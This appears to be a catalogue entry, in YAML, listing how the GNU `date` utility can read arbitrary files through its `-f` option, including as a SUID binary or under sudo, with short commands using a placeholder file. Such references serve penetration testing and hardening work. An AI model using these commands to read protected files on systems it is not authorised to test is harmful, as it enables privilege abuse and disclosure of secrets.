---
description: |
  Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.

  This only works for the GNU variant of `date`.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        date -f $LFILE
  suid:
    - code: |
        LFILE=file_to_read
        ./date -f $LFILE
  sudo:
    - code: |
        LFILE=file_to_read
        sudo date -f $LFILE
---
